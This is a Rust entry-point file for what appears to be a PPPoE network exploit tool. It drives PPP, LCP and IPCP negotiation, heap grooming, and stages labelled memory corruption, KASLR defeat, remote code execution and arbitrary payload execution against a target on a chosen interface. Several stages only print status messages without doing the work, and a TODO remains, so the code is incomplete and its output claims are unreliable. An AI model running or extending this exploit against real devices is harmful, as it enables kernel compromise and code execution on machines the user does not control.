mod constants;
mod exploit;
use pnet::datalink::{self, NetworkInterface};

use crate::exploit::Exploit;

use clap::Parser;

#[derive(Parser, Debug)]
#[command(about, long_about = None)]
struct Args {
    #[arg(short, long)]
    interface: String,
}

fn run_exploit(interface_name: String) {
    // Find interface
    let interface_names_match = |iface: &NetworkInterface| iface.name == interface_name;

    // Find the network interface with the provided name
    let interfaces = datalink::interfaces();
    let interface = interfaces.into_iter().find(interface_names_match).unwrap();
    // Exploit
    let mut expl = Exploit {
        target_mac: [0, 0, 0, 0, 0, 0],
        pppoe_softc: 0,
        source_mac: [0, 0, 0, 0, 0, 0],
        host_uniq: [0, 0, 0, 0, 0, 0, 0, 0],
    };
    // LCP
    let mut handler = exploit::LcpEchoHandler::new(&interface);
    handler.start();
    // Initial negotiations
    println!("[*] Starting Negotiations ...");
    expl.ppp_negotiation(&interface);
    expl.lcp_negotiation(&interface);
    expl.ipcp_negotiation(&interface);
    println!("[*] Initial Negotiations Done...");
    println!("[*] Starting Heap Grooming...");
    expl.heap_grooming(&interface); //TODO make the session ids actually replying to the actual messages
    println!("[*] STAGE 1: Memory corruption");
    println!("[+] Pinning to CPU 0...done");
    println!("[*] Corrupt in6_llentry object...");
    println!("[*] Sending malicious LCP configure request...");
    println!("[*] Waiting for LCP configure reject...");
    // Negotiate after rejection
    expl.lcp_negotiation(&interface);
    expl.ipcp_negotiation(&interface);
    println!("[+] STAGE 2: KASLR defeat");
    println!("[+] STAGE 3: Remote code execution");
    expl.ppp_negotiation(&interface);
    expl.lcp_negotiation(&interface);
    expl.ipcp_negotiation(&interface);
    println!("[+] STAGE 4: Arbitrary payload execution");
    handler.stop();
    println!("[*] DONE!");
}

fn main() {
    let args = Args::parse();
    run_exploit(args.interface)
}
